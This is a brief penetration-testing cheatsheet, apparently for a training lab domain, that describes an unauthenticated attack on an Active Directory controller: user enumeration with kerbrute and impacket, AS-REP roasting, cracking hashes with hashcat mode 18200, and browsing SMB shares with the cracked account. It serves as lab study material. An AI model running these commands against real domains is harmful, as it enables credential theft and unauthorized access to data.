# Cheatsheet — No Preauth

## Targets

- **dc01** — corp.pentrain.local domain controller
- entry: none needed — the whole attack is unauthenticated

## Useful commands

```bash
# user enum without creds
kerbrute userenum --dc <dc01> -d corp.pentrain.local <users.txt>
impacket-GetADUsers -all -no-pass -dc-ip <dc01> corp.pentrain.local/

# AS-REP roast (no creds)
impacket-GetNPUsers -no-pass -usersfile users.txt -dc-ip <dc01> corp.pentrain.local/
hashcat -m 18200 asrep.txt <wordlist>

# the roasted account's loot channel
smbclient -L //<dc01> -U 'corp\<user>%<pw>'
smbclient //<dc01>/<share> -U 'corp\<user>%<pw>' -c 'recurse;ls'
```

## Concepts

- No-preauth accounts give their hash to *anyone* — the DC answers
- AS-REP crack = hashcat 18200; Kerberoast (TGS) = 13100 — different modes
- An unprivileged roasted account's prize is usually a share, not a shell
